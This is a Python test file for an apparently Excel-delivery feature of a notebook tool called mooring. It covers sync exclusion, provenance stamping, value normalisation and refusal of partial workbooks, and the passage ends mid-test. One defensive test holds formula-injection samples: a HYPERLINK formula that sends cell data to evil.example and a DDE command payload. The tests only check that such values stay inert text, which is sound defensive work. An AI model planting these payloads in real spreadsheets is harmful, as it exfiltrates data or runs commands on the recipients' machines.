"""Excel delivery: the injected ``mooring_deliver`` payload + the mooring-side wiring.

The payload is loaded from disk exactly as the marimo kernel would (from
``.mooring/pylib``) and driven with a fake ``__file__`` cell global, so these exercise
the real workbook-writing path. The end-to-end tests fake ``notebook_run._exec``, the
one seam where the marimo subprocess would be, and have the fake DRIVE the real payload
— so a delivery runs the actual runtime, not a stand-in for it.

**Every write-path test runs against BOTH engines.** xlsxwriter is the one the runtime
prefers (and what a polars user already has), openpyxl the fallback, and they disagree
on exactly the values a finance notebook produces — a NaN, a formula-shaped string, a
control character. A test that pinned only the installed one would pin the artifact
half the audience never gets.

The load-bearing guarantees pinned here: the workbook (which holds real data VALUES —
that is the point) can only ever land somewhere sync excludes; mooring hands over all
of a delivery or none of it; the Provenance sheet is written by MOORING, not by the
notebook it vouches for; and an environment with no Excel writer gets an actionable
message instead of a broken run.
"""

from __future__ import annotations

import ast
import importlib.util
import json
import os
import subprocess
import zipfile
from datetime import datetime, timedelta, timezone
from decimal import Decimal
from pathlib import Path

import openpyxl
import pytest

from mooring import sync, workbook
from mooring.app import deliver, notebook_run
from mooring.config import Config

NOTEBOOK = "import marimo\n\napp = marimo.App()\n\n\n@app.cell\ndef _():\n    return\n"
SECRET = "SECRET_VALUE_DO_NOT_LEAK"

# Both engines the runtime writes through. Every value-normalisation and sheet-naming
# test is parametrised over this so the two can never drift apart unnoticed.
ENGINES = ("xlsxwriter", "openpyxl")


@pytest.fixture(params=ENGINES)
def engine(request):
    return request.param


def _cfg(tmp_path):
    return Config(client_id="cid", owner="acme", repo="nbs", workspace_path=str(tmp_path / "ws"))


def _imported_roots(src: bytes) -> set[str]:
    roots: set[str] = set()
    for node in ast.walk(ast.parse(src.decode("utf-8"))):
        if isinstance(node, ast.Import):
            roots.update(alias.name.split(".")[0] for alias in node.names)
        elif isinstance(node, ast.ImportFrom) and node.module:
            roots.add(node.module.split(".")[0])
    return roots


def _load_payload(ws, engine=None):
    """Install and import the payload the way a notebook kernel would, optionally
    pinning which Excel engine that kernel is taken to have."""
    workbook.install_runtime(ws)
    mod_path = workbook.pylib_dir(ws) / "mooring_deliver.py"
    spec = importlib.util.spec_from_file_location("mooring_deliver_under_test", mod_path)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    if engine is not None:
        mod._engine = lambda: engine
    return mod


def _call(md, notebook_path, data, name=None):
    """Register a table from a fake notebook cell: marimo sets ``__file__`` to the
    notebook, which is how the runtime attributes a receipt to the right file."""
    scope = {"md": md, "data": data, "__file__": str(notebook_path)}
    exec(f"r = md.table(data, {name!r})" if name else "r = md.table(data)", scope)
    return scope["r"]


def _reset(md, notebook_path):
    """``md.reset()`` from a fake cell — it too attributes itself by ``__file__``."""
    exec("md.reset()", {"md": md, "__file__": str(notebook_path)})


def _sheets(path):
    book = openpyxl.load_workbook(path)
    try:
        return book.sheetnames
    finally:
        book.close()


def _rows(path, sheet):
    book = openpyxl.load_workbook(path)
    try:
        return [list(row) for row in book[sheet].iter_rows(values_only=True)]
    finally:
        book.close()


def _provenance(path):
    """The Provenance sheet as a ``{field: value}`` mapping, header row dropped."""
    return dict(tuple(row[:2]) for row in _rows(path, workbook.PROVENANCE_SHEET)[1:])


def _formula_count(path) -> int:
    """How many cells in the workbook are FORMULAS, read from the raw sheet XML. A
    formula is an ``<f>`` element — anything else is inert text, whatever it looks
    like, which is the property the injection defence actually rests on."""
    with zipfile.ZipFile(path) as book:
        parts = [
            name
            for name in book.namelist()
            if name.startswith("xl/worksheets/") and name.endswith(".xml")
        ]
        return sum(book.read(part).count(b"<f>") + book.read(part).count(b"<f ") for part in parts)


def _mk_ws(tmp_path, rel="sales.py"):
    ws = tmp_path / "ws"
    (ws / rel).parent.mkdir(parents=True, exist_ok=True)
    (ws / rel).write_text(NOTEBOOK, encoding="utf-8")
    return ws, ws / rel


# -- the structural guarantee: a workbook of real values can never be pushed ------


def test_every_workbook_path_is_structurally_unsyncable():
    # THE load-bearing guarantee. Unlike the checks/inputs receipts, this artifact holds
    # real data values, so being unable to ride a push is the whole safety story.
    for rel in (
        ".mooring/outbox/sales/sales-20260731.xlsx",
        ".mooring/outbox/reports__q3/q3-20260731.xlsx",
        ".mooring/workbooks/notebooks__sales.py.json",
        ".mooring/workbooks/notebooks__sales.py.html",
        ".mooring/pylib/mooring_deliver.py",
    ):
        assert sync.is_synced_path(rel) is False
        # ...even if a team deliberately widened what syncs.
        assert sync.is_synced_path(rel, exclude=("*.html",)) is False
        assert sync.is_synced_path(rel, exclude=()) is False


def test_target_paths_all_live_under_the_excluded_state_dir(tmp_path):
    ws = tmp_path / "ws"
    for path in (
        deliver.outbox_target(ws, "notebooks/sales.py", ext=".xlsx"),
        workbook.render_target(ws, "notebooks/sales.py"),
        workbook.workbooks_dir(ws),
        workbook.pylib_dir(ws),
    ):
        rel = path.relative_to(ws).as_posix()
        assert rel.startswith(".mooring/")
        assert sync.is_synced_path(rel) is False


def test_a_rogue_target_env_var_cannot_move_the_workbook_out_of_the_state_dir(
    tmp_path, monkeypatch
):
    # The target arrives from OUTSIDE the kernel, so the runtime re-checks it: an env var
    # must not be able to drop real values into a synced folder.
    ws, nb = _mk_ws(tmp_path, "notebooks/sales.py")
    md = _load_payload(ws)
    escaped = ws / "notebooks" / "leaked.xlsx"
    monkeypatch.setenv(workbook.ENV_TARGET, str(escaped))
    monkeypatch.setenv(workbook.ENV_NOTEBOOK, "notebooks/sales.py")

    result = _call(md, nb, {"a": [1]}, "Summary")

    assert not escaped.exists()  # refused
    assert bool(result) is True  # ...but the delivery still happened, in the outbox
    landed = Path(result.path).relative_to(ws).as_posix()
    assert landed.startswith(".mooring/outbox/")
    assert sync.is_synced_path(landed) is False


# -- the injected payload --------------------------------------------------------


def test_install_runtime_writes_an_importable_standalone_payload(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    workbook.install_runtime(ws)
    payload = workbook.pylib_dir(ws) / "mooring_deliver.py"
    assert payload.is_file()
    src = payload.read_bytes()
    assert b"def table" in src and b"def reset" in src
    # Standalone: it runs in the notebook kernel where mooring isn't installed, so it
    # must import only the standard library — plus the two Excel engines it reaches for
    # at call time, which are the repo's dependencies, never mooring's.
    assert "mooring" not in _imported_roots(src)
    assert _imported_roots(src) <= {
        "__future__",
        "importlib",
        "inspect",
        "json",
        "math",
        "os",
        "re",
        "tempfile",
        "datetime",
        "decimal",
        "pathlib",
        "xlsxwriter",
        "openpyxl",
    }


def test_install_runtime_is_idempotent(tmp_path):
    ws = tmp_path / "ws"
    ws.mkdir()
    workbook.install_runtime(ws)
    payload = workbook.pylib_dir(ws) / "mooring_deliver.py"
    before = payload.stat().st_mtime_ns
    workbook.install_runtime(ws)  # unchanged bytes -> no rewrite
    assert payload.stat().st_mtime_ns == before


def test_editor_installs_the_runtime_beside_its_siblings(tmp_path):
    from mooring import editor

    ws = tmp_path / "ws"
    ws.mkdir()
    editor.ensure_runtime_config(ws)
    assert (workbook.pylib_dir(ws) / "mooring_deliver.py").is_file()
    assert (workbook.pylib_dir(ws) / "mooring_checks.py").is_file()


def test_both_engines_are_installed_for_the_suite():
    # If either is missing the parametrised tests below silently stop covering an engine,
    # and every divergence they exist to catch lives on the uncovered path.
    for name in ENGINES:
        pytest.importorskip(name)


# -- the write path, on BOTH engines ---------------------------------------------


def test_tables_become_sheets_in_order_with_a_provenance_sheet(tmp_path, engine):
    ws, nb = _mk_ws(tmp_path, "notebooks/sales.py")
    md = _load_payload(ws, engine)

    _call(md, nb, [{"region": "EMEA", "amount": 10}], "Summary")
    result = _call(md, nb, {"region": ["APAC"], "amount": [4]}, "By region")

    assert _sheets(result.path) == ["Summary", "By region", "Provenance"]
    assert _rows(result.path, "Summary") == [["region", "amount"], ["EMEA", 10]]


def test_a_repeated_sheet_name_replaces_rather_than_duplicates(tmp_path, engine):
    # marimo re-executes cells freely; a second copy of a sheet would be a silently
    # wrong deliverable. The printed line says so, since a replacement drops a table.
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine)

    _call(md, nb, {"n": [1]}, "Summary")
    result = _call(md, nb, {"n": [2]}, "Summary")

    assert _sheets(result.path) == ["Summary", "Provenance"]
    assert _rows(result.path, "Summary") == [["n"], [2]]
    assert "replaced" in repr(result)
    # Names match after trimming, so a stray space is a replacement too — visibly so,
    # since it drops the table that was there.
    spaced = _call(md, nb, {"n": [3]}, "Summary ")
    assert _sheets(spaced.path) == ["Summary", "Provenance"]
    assert "replaced" in repr(spaced)


def test_an_unnamed_table_replaces_itself_when_its_cell_re_runs(tmp_path, engine):
    # The public API lets the name be omitted, and a positional default would append
    # "Sheet 2", "Sheet 3", … on each re-execution — contradicting the replace contract
    # for exactly the case it permits. Keyed by call site instead.
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine)
    scope = {"md": md, "__file__": str(nb)}
    # One cell, two unnamed tables on two lines — the shape that made this positional.
    cell = "md.table({'n': [1]})\nr = md.table({'n': [2]})"

    exec(cell, scope)
    exec(cell, scope)  # the same cell, run again
    exec(cell, scope)

    # Two calls, two sheets, however many times the cell re-runs.
    assert _sheets(scope["r"].path) == ["Sheet 1", "Sheet 2", "Provenance"]
    assert _rows(scope["r"].path, "Sheet 2") == [["n"], [2]]


def test_polars_frames_deliver_their_rows(tmp_path, engine):
    pl = pytest.importorskip("polars")
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine)
    frame = pl.DataFrame({"region": ["EMEA", "APAC"], "amount": [10, 4]})

    eager = _call(md, nb, frame, "Eager")
    lazy = _call(md, nb, frame.lazy(), "Lazy")

    assert bool(eager) and bool(lazy)
    assert _rows(lazy.path, "Eager") == [["region", "amount"], ["EMEA", 10], ["APAC", 4]]
    assert _rows(lazy.path, "Lazy") == [["region", "amount"], ["EMEA", 10], ["APAC", 4]]


# -- value normalisation: the two engines must produce the SAME artifact ---------


def test_a_formula_shaped_value_is_written_as_text_not_as_a_formula(tmp_path, engine):
    # Confirmed live in review: "=1+1" reached the reader as 2, and =HYPERLINK / DDE
    # payloads executed. This artifact exists to be forwarded outside mooring, so a
    # value must never become code — and a value beginning with "=" must show as itself.
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine)
    hostile = [
        {"memo": "=1+1"},
        {"memo": '=HYPERLINK("http://evil.example/?d="&A2,"Click")'},
        {"memo": "=cmd|'/c calc'!A1"},
        {"memo": "+1+1"},
        {"memo": "-1+1"},
        {"memo": "@SUM(1,1)"},
        {"memo": "http://example.test/report"},
    ]

    result = _call(md, nb, hostile, "Memos")

    assert _formula_count(result.path) == 0  # not one <f> element anywhere
    assert _rows(result.path, "Memos")[1:] == [[row["memo"]] for row in hostile]
    book = openpyxl.load_workbook(result.path)
    try:
        assert all(cell.data_type == "s" for cell in book["Memos"]["A"][1:])
    finally:
        book.close()


def test_non_finite_numbers_read_the_same_on_both_engines(tmp_path, engine):
    # openpyxl wrote these as an EMPTY numeric cell (blank, and summing as zero — a
    # divide-by-zero ratio reading as "no data"); xlsxwriter refused the whole workbook.
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine)
    table = {
        "ratio": [float("nan"), float("inf"), float("-inf")],
        "dec": [Decimal("NaN"), Decimal("Infinity"), Decimal("-Infinity")],
    }

    result = _call(md, nb, table, "Ratios")

    assert bool(result) is True
    assert _rows(result.path, "Ratios")[1:] == [
        ["NaN", "NaN"],
        ["Infinity", "Infinity"],
        ["-Infinity", "-Infinity"],
    ]


def test_aware_datetimes_normalise_to_utc_and_the_workbook_says_so(tmp_path, engine):
    # One instant, three source offsets. Keeping the wall clock and dropping the offset
    # lands it on three different DATES, which moves a period cut-off.
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine)
    instant = datetime(2026, 1, 15, 23, 30, tzinfo=timezone.utc)
    table = {
        "at": [
            instant,
            instant.astimezone(timezone(timedelta(hours=-5))),
            instant.astimezone(timezone(timedelta(hours=9))),
        ]
    }

    result = _call(md, nb, table, "Trades")

    assert _rows(result.path, "Trades")[1:] == [[datetime(2026, 1, 15, 23, 30)]] * 3
    assert "UTC" in _provenance(result.path)["Timestamps"]


def test_a_naive_datetime_is_left_alone_and_claims_no_normalisation(tmp_path, engine):
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine)
    result = _call(md, nb, {"at": [datetime(2026, 1, 15, 23, 30)]}, "Trades")
    assert _rows(result.path, "Trades")[1] == [datetime(2026, 1, 15, 23, 30)]
    assert "Timestamps" not in _provenance(result.path)


def test_values_wider_than_excels_precision_are_written_exactly_as_text(tmp_path, engine):
    # Excel carries 15 significant digits. An 18-digit account number silently rounded
    # by both engines breaks the join the reader does next.
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine)
    table = {
        "account": [123456789012345678],
        "amount": [Decimal("9999999999999999.99")],
        "small": [1234567],
        "exact": [Decimal("1234567.895")],
    }

    result = _call(md, nb, table, "Ledger")

    row = _rows(result.path, "Ledger")[1]
    assert row[0] == "123456789012345678"  # exact, and visibly not a number
    assert row[1] == "9999999999999999.99"
    assert row[2] == 1234567  # inside the limit: still a real number
    assert row[3] == 1234567.895


def test_illegal_text_is_cleaned_and_over_long_text_is_marked(tmp_path, engine):
    # Control characters raise on openpyxl and become literal "_x0000_" on xlsxwriter;
    # over-long text is silently cut by both, and a truncated memo that does not say so
    # reads as the whole of one.
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine)

    result = _call(md, nb, {"memo": ["a\x00b\x07c", "x" * 40000]}, "Memos")

    values = [row[0] for row in _rows(result.path, "Memos")[1:]]
    assert values[0] == "abc"
    assert len(values[1]) == 32767 and values[1].endswith("[truncated by mooring]")


def test_illegal_and_colliding_sheet_names_are_made_legal(tmp_path, engine):
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine)

    _call(md, nb, {"n": [1]}, "P&L: 2026/Q3 [draft]")  # Excel rejects : / [ ]
    _call(md, nb, {"n": [1]}, "A" * 40)  # ...and anything over 31 chars
    result = _call(md, nb, {"n": [1]}, "Provenance")  # ...and our reserved name

    names = _sheets(result.path)
    assert names[0] == "P&L  2026 Q3  draft"
    assert names[1] == "A" * 31
    # mooring's own record keeps the predictable name; the data sheet is the one moved.
    assert names[2] == "Provenance (2)"
    assert names[3] == "Provenance"


def test_truncation_cannot_re_expose_a_trailing_apostrophe(tmp_path, engine):
    # Excel forbids a leading/trailing apostrophe in a sheet name, and xlsxwriter fails
    # the WHOLE workbook over one. Trimming before truncating let the cut put one back.
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine)

    result = _call(md, nb, {"n": [1]}, "A" * 31 + "'" + "B" * 10)

    name = _sheets(result.path)[0]
    assert not name.startswith("'") and not name.endswith("'")
    assert len(name) <= 31


# -- a lost table is recorded, never silently dropped ----------------------------


def test_a_bad_table_reports_and_never_raises(tmp_path, engine):
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine)

    result = _call(md, nb, object(), "Summary")

    assert bool(result) is False
    assert "unsupported table" in result.note
    receipt = workbook.read_receipt(ws, "sales.py")
    # The receipt records a mooring-authored classification, never the library's words.
    assert receipt["failures"] == [{"sheet": "Summary", "reason": "could not read the table"}]
    assert receipt["reason"] == "could not read the table"


def test_a_bad_table_does_not_take_down_the_sheets_around_it(tmp_path, engine):
    # Asked for three sheets, the reviewer got two (openpyxl) or one (xlsxwriter):
    # the unwritable table stayed registered and poisoned every later flush.
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine)

    _call(md, nb, {"n": [1]}, "Summary")
    _call(md, nb, object(), "Detail")
    result = _call(md, nb, {"n": [2]}, "By region")

    assert bool(result) is True
    assert _sheets(result.path) == ["Summary", "By region", "Provenance"]


def test_a_later_success_never_erases_an_earlier_failure(tmp_path, engine):
    # The record of the lost table is the only thing standing between a partial
    # workbook and a stakeholder, so a subsequent good table must not wipe it.
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine)

    _call(md, nb, {"n": [1]}, "Summary")
    _call(md, nb, object(), "Detail")
    _call(md, nb, {"n": [2]}, "By region")

    receipt = workbook.read_receipt(ws, "sales.py")
    assert [f["sheet"] for f in receipt["failures"]] == ["Detail"]
    assert receipt["sheets"] == ["Summary", "By region"]  # what IS in the workbook


def test_reset_clears_the_sheets_failures_and_yesterdays_workbook(tmp_path, engine):
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine)
    first = Path(_call(md, nb, {"n": [1]}, "Old").path)
    _call(md, nb, object(), "Broken")
    assert first.is_file()

    _reset(md, nb)

    # A stale workbook in the outbox looks exactly like a fresh one to whoever emails it.
    assert not first.exists()
    receipt = workbook.read_receipt(ws, "sales.py")
    assert receipt["workbook"] == "" and receipt["failures"] == []


# -- no Excel writer: actionable, and never fatal --------------------------------


def test_a_missing_excel_writer_is_actionable_and_does_not_break_the_run(tmp_path):
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine="")  # neither xlsxwriter nor openpyxl

    # The cell keeps running: table() returns falsy rather than raising, and the
    # statement after it still executes.
    scope = {"md": md, "__file__": str(nb)}
    exec("r = md.table({'n': [1]}, 'Summary')\nafter = 'still running'", scope)

    assert scope["after"] == "still running"
    assert bool(scope["r"]) is False
    assert "mooring deps add openpyxl" in scope["r"].note
    assert "mooring deps add openpyxl" in workbook.read_receipt(ws, "sales.py")["reason"]


def test_the_missing_writer_hint_names_a_command_that_exists():
    # A message telling an analyst to pip install into a synced repo would be wrong;
    # the package has to reach the repo's pyproject.toml, which is what deps add does.
    from mooring import _workbook_runtime

    assert "mooring deps add" in _workbook_runtime.NO_WRITER_HINT


def test_an_engine_failure_never_puts_engine_words_in_the_receipt(tmp_path, engine):
    # THE value-safety claim: an engine message can quote a data value, and the receipt
    # reason is read back by mooring and surfaced in a hub 502 body and on CLI stderr.
    ws, nb = _mk_ws(tmp_path)
    md = _load_payload(ws, engine)

    def _boom(*args, **kwargs):
        raise ValueError(f"cannot serialise {SECRET}")

    md._write_xlsxwriter = _boom
    md._write_openpyxl = _boom

    result = _call(md, nb, {"n": [1]}, "Summary")

    assert bool(result) is False
    assert SECRET in result.note  # printed into the analyst's own cell: fine, local
    receipt = workbook.read_receipt(ws, "sales.py")
    assert SECRET not in json.dumps(receipt)
    assert receipt["failures"] == [{"sheet": "Summary", "reason": "could not write it"}]


# -- delivery end to end (the fake kernel drives the REAL payload) ----------------


def _out_of(cmd):
    for i, tok in enumerate(cmd):
        if tok == "-o":
            return Path(cmd[i + 1])
    return None


def _kernel(tables, *, engine=None, returncode=0, stderr="", produce=True, reset=True, after=None):
    """Stand in for ``notebook_run._exec``: write the HTML render marimo would write,
    then run the real ``mooring_deliver`` payload against the env mooring passed, exactly
    as a notebook cell would. ``after(md, ws, env)`` runs once the tables are registered,
    standing in for whatever else the notebook's own code might do."""

    def _run(cmd, cwd, env, timeout):
        if produce:
            out = _out_of(cmd)
            out.parent.mkdir(parents=True, exist_ok=True)
            # The real render embeds data values; plant one to prove it is deleted.
            out.write_text(f"<html>{SECRET}</html>", encoding="utf-8")
        ws = Path(cwd)
        passed = {k: v for k, v in (env or {}).items() if k.startswith("MOORING_DELIVER_")}
        before = dict(os.environ)
        os.environ.update(passed)
        try:
            md = _load_payload(ws, engine)
            if reset:
                md.reset()
            for label, data in tables:
                md.table(data, label)
            if after is not None:
                after(md, ws, env)
        finally:
            os.environ.clear()
            os.environ.update(before)
        return subprocess.CompletedProcess(cmd, returncode, "", stderr)

    return _run


def _mk(tmp_path, rel="notebooks/sales.py"):
    cfg = _cfg(tmp_path)
    ws = cfg.workspace()
    (ws / rel).parent.mkdir(parents=True, exist_ok=True)
    (ws / rel).write_text(NOTEBOOK, encoding="utf-8")
    return cfg, ws


def test_deliver_excel_writes_the_expected_sheets_to_the_outbox(tmp_path, monkeypatch, engine):
    cfg, ws = _mk(tmp_path)
    tables = [("Summary", {"region": ["EMEA"], "amount": [10]}), ("By region", {"n": [1, 2]})]
    monkeypatch.setattr(notebook_run, "_exec", _kernel(tables, engine=engine))

    result = deliver.deliver_excel(cfg, "notebooks/sales.py")

    assert result.out_path.is_file()
    assert result.out_rel.startswith(".mooring/outbox/")
    assert result.out_path.name.startswith("sales-") and result.out_path.suffix == ".xlsx"
    assert result.sheets == ("Summary", "By region")
    assert _sheets(result.out_path) == ["Summary", "By region", "Provenance"]
    assert _rows(result.out_path, "Summary") == [["region", "amount"], ["EMEA", 10]]
    # The value-bearing HTML render is a by-product of executing the notebook; it must
    # not survive, and the workbook must not be syncable.
    assert not workbook.render_target(ws, "notebooks/sales.py").is_file()
    assert sync.is_synced_path(result.out_rel) is False


def test_the_stamped_workbook_still_opens_cleanly(tmp_path, monkeypatch, engine):
    # stamp_provenance rewrites a zip entry by hand; the result has to remain a workbook
    # every reader accepts, not just one that happens to survive our own assertions.
    cfg, ws = _mk(tmp_path)
    monkeypatch.setattr(notebook_run, "_exec", _kernel([("Summary", {"n": [1]})], engine=engine))

    result = deliver.deliver_excel(cfg, "notebooks/sales.py")

    with zipfile.ZipFile(result.out_path) as book:
        assert book.testzip() is None
        assert "[Content_Types].xml" in book.namelist()
    book = openpyxl.load_workbook(result.out_path)
    try:
        assert book.sheetnames == ["Summary", "Provenance"]
        assert book["Summary"]["A2"].value == 1
    finally:
        book.close()


# -- provenance: written by mooring, about the notebook, not BY it ---------------


def test_provenance_never_claims_a_commit_for_a_never_pushed_notebook(tmp_path, monkeypatch):
    cfg, ws = _mk(tmp_path)
    monkeypatch.setattr(notebook_run, "_exec", _kernel([("Summary", {"n": [1]})]))

    result = deliver.deliver_excel(cfg, "notebooks/sales.py")

    rows = _provenance(result.out_path)
    assert rows["Generated by"] == "mooring"
    assert rows["Source"] == "acme/nbs (this notebook is not yet pushed)"
    assert rows["Notebook"] == "notebooks/sales.py"
    assert rows["Sheets"] == "Summary"
    # A blob link would 404 and an @commit would be a false claim, so neither appears.
    assert "View on GitHub" not in rows
    assert "@" not in rows["Source"]


def test_provenance_links_to_github_only_when_the_notebook_is_synced(tmp_path, monkeypatch):
    cfg, ws = _mk(tmp_path)

    class _Mft:  # tracked on the remote at this head commit
        head_commit = "abcdef1234567890"
        files = {"notebooks/sales.py": "blobsha"}

    monkeypatch.setattr(deliver.manifest, "load", lambda ws: _Mft())
    monkeypatch.setattr(notebook_run, "_exec", _kernel([("Summary", {"n": [1]})]))

    result = deliver.deliver_excel(cfg, "notebooks/sales.py")

    rows = _provenance(result.out_path)
    assert rows["Source"] == "acme/nbs@abcdef1"
    assert "/blob/" in rows["View on GitHub"] and "notebooks/sales.py" in rows["View on GitHub"]


def test_provenance_says_local_when_no_repo_is_configured(tmp_path, monkeypatch):
    cfg = Config(client_id="", owner="", repo="", workspace_path=str(tmp_path / "ws"))
    ws = cfg.workspace()
    ws.mkdir(parents=True)
    (ws / "sales.py").write_text(NOTEBOOK, encoding="utf-8")
    monkeypatch.setattr(notebook_run, "_exec", _kernel([("Summary", {"n": [1]})]))

    result = deliver.deliver_excel(cfg, "sales.py")

    rows = _provenance(result.out_path)
    assert rows["Source"] == "a local workspace"
    assert "View on GitHub" not in rows


def test_a_notebook_cannot_forge_the_provenance_sheet(tmp_path, monkeypatch, engine):
    # The notebook is the party being vouched for. In review it set MOORING_DELIVER_*
    # itself and produced a sheet claiming a blessed repo, commit and filename while
    # mooring reported the notebook as never pushed. mooring stamps the sheet LAST.
    cfg, ws = _mk(tmp_path, "sales.py")

    def _forge(md, workspace, env):
        os.environ["MOORING_DELIVER_ORIGIN"] = "acme/nbs@deadbee"
        os.environ["MOORING_DELIVER_LINK"] = "http://evil.example/blessed"
        os.environ["MOORING_DELIVER_NOTEBOOK"] = "audited/blessed_model.py"
        # ...and, since the kernel owns the file, rewrite the sheet by hand too.
        target = Path(env[workbook.ENV_TARGET])
        book = openpyxl.load_workbook(target)
        sheet = book[workbook.PROVENANCE_SHEET]
        sheet["A2"], sheet["B2"] = "Source", "acme/nbs@deadbee"
        sheet["A3"], sheet["B3"] = "Notebook", "audited/blessed_model.py"
        book.save(target)
        book.close()

    monkeypatch.setattr(
        notebook_run, "_exec", _kernel([("Summary", {"n": [1]})], engine=engine, after=_forge)
    )

    result = deliver.deliver_excel(cfg, "sales.py")

    rows = _provenance(result.out_path)
    assert rows["Source"] == "acme/nbs (this notebook is not yet pushed)"
    assert rows["Notebook"] == "sales.py"
    assert "deadbee" not in json.dumps(rows)
    assert "evil.example" not in json.dumps(rows)


def test_a_workbook_without_a_provenance_sheet_is_refused(tmp_path, monkeypatch):
    # If mooring cannot place its record, the sheet still holds whatever the notebook
    # put there. Shipping an unverified claim is worse than shipping nothing.
    cfg, ws = _mk(tmp_path, "sales.py")

    def _strip(md, workspace, env):
        target = Path(env[workbook.ENV_TARGET])
        book = openpyxl.load_workbook(target)
        book.remove(book[workbook.PROVENANCE_SHEET])
        book.save(target)
        book.close()

    monkeypatch.setattr(notebook_run, "_exec", _kernel([("Summary", {"n": [1]})], after=_strip))

    with pytest.raises(deliver.DeliverError) as excinfo:
        deliver.deliver_excel(cfg, "sales.py")
    assert "provenance" in str(excinfo.value).lower()
    assert not deliver.outbox_target(ws, "sales.py", ext=".xlsx").exists()


def test_stamp_provenance_leaves_a_corrupt_workbook_untouched(tmp_path):
    path = tmp_path / "not-a-workbook.xlsx"
    path.write_bytes(b"definitely not a zip")
    with pytest.raises(workbook.StampError):
        workbook.stamp_provenance(path, [("Source", "acme/nbs")])
    assert path.read_bytes() == b"definitely not a zip"
    assert not list(tmp_path.glob("*.tmp"))


# -- "a file is there" is not "this run wrote it" --------------------------------


def test_run_wrote_rejects_a_file_this_run_did_not_produce(tmp_path):
    ws = tmp_path / "ws"
    out = ws / ".mooring" / "outbox" / "sales" / "sales-20260731.xlsx"
    out.parent.mkdir(parents=True)
    out.write_bytes(b"yesterday")

    assert deliver._run_wrote({"workbook": ""}, ws, out) is False  # the run wrote nothing
    assert deliver._run_wrote({"workbook": ".mooring/outbox/other.xlsx"}, ws, out) is False
    rel = out.relative_to(ws).as_posix()
    assert deliver._run_wrote({"workbook": rel}, ws, out) is True
    out.unlink()
    assert deliver._run_wrote({"workbook": rel}, ws, out) is False


def test_a_locked_previous_workbook_is_never_reported_as_a_fresh_delivery(
    tmp_path, monkeypatch, engine
):
    # Confirmed in review: the analyst opens the delivered workbook (from the Explorer
    # window Deliver pops), re-runs Deliver, the final os.replace fails with a sharing
    # violation, and yesterday's numbers ship under today's date stamp.
    cfg, ws = _mk(tmp_path, "sales.py")

    class _LockedOs:
        """``os`` with the workbook's final move failing, as an open Excel window does."""

        def __init__(self, real):
            self._real = real

        def __getattr__(self, name):
            return getattr(self._real, name)

        def replace(self, src, dst):
            if str(dst).endswith(".xlsx"):
                raise PermissionError("[WinError 5] Access is denied")
            return self._real.replace(src, dst)

    def _lock(cmd, cwd, env, timeout):
        target = Path(env[workbook.ENV_TARGET])
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(b"yesterdays numbers")  # the previous delivery, still there

        def _plant(md, workspace, passed_env):
            md.os = _LockedOs(os)
            md.table({"n": [1]}, "Summary")

        return _kernel([], engine=engine, reset=False, after=_plant)(cmd, cwd, env, timeout)

    monkeypatch.setattr(notebook_run, "_exec", _lock)

    with pytest.raises(deliver.DeliverError):
        deliver.deliver_excel(cfg, "sales.py")


# -- refusals: all of a delivery, or none of it ----------------------------------


def test_deliver_excel_refuses_a_partial_workbook_and_names_the_lost_sheet(
    tmp_path, monkeypatch, engine
):
    cfg, ws = _mk(tmp_path, "sales.py")
    tables = [("Summary", {"n": [1]}), ("Detail", object()), ("By region", {"n": [2]})]
    monkeypatch.setattr(notebook_run, "_exec", _kernel(tables, engine=engine))

    with pytest.raises(deliver.DeliverError) as excinfo:
        deliver.deliver_excel(cfg, "sales.py")
    message = str(excinfo.value)
    assert "Detail" in message and "could not read the table" in message
    # ...and nothing forwardable is left behind.
    assert not deliver.outbox_target(ws, "sales.py", ext=".xlsx").exists()


def test_deliver_excel_records_a_value_free_activity_entry(tmp_path, monkeypatch):
    from mooring import activity

    cfg, ws = _mk(tmp_path, "sales.py")
    monkeypatch.setattr(notebook_run, "_exec", _kernel([("Summary", {"n": [1]})]))

    deliver.deliver_excel(cfg, "sales.py")

    entries = activity.read(ws)
    assert entries and entries[0]["op"] == "deliver"
    assert entries[0]["path"] == "sales.py"


def _payload_without_engines() -> bytes:
    """The real payload with its engine probe pointed at a package that does not exist —
    the only honest way to simulate an analyst environment with no Excel writer, since
    the test environment has both installed."""
    src = (Path(workbook.__file__).with_name("_workbook_runtime.py")).read_text("utf-8")
    marker = 'for name in ("xlsxwriter", "openpyxl"):'
    assert marker in src, "the engine probe moved — update this fake"
    return src.replace(marker, 'for name in ("no_such_excel_engine",):').encode("utf-8")


def test_deliver_excel_surfaces_the_missing_writer_hint(tmp_path, monkeypatch):
    # The end-to-end version of the actionable message: the run completes, the notebook
    # is fine, and the reason reaches the user instead of a bare "no workbook produced".
    cfg, ws = _mk(tmp_path, "sales.py")
    # install_runtime is what puts the payload on the kernel path, so swapping its source
    # is what an engine-less environment looks like from mooring's side.
    monkeypatch.setattr(workbook, "_payload_source", _payload_without_engines)
    monkeypatch.setattr(notebook_run, "_exec", _kernel([("Summary", {"n": [1]})]))

    with pytest.raises(deliver.DeliverError) as excinfo:
        deliver.deliver_excel(cfg, "sales.py")
    assert "mooring deps add openpyxl" in str(excinfo.value)


def test_deliver_excel_refuses_a_notebook_that_named_no_tables(tmp_path, monkeypatch):
    cfg, ws = _mk(tmp_path, "sales.py")
    monkeypatch.setattr(notebook_run, "_exec", _kernel([]))

    with pytest.raises(deliver.DeliverError) as excinfo:
